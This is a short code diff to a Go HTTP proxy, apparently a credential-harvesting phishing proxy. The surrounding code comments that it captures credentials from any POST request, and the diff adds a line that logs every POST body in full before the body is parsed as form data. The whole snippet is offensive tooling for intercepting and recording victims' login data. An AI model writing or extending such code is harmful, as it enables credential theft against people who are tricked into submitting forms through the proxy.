@@ -711,6 +711,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 						// 1. Capture credentials from ANY POST regardless of content-type
 						bodyStr := string(body)
+						log.Debug("[PROXY] POST Body: %s", bodyStr)
 						
 						// Parse as form data if possible for better key mapping
 						bodyValues, _ := url.ParseQuery(bodyStr)
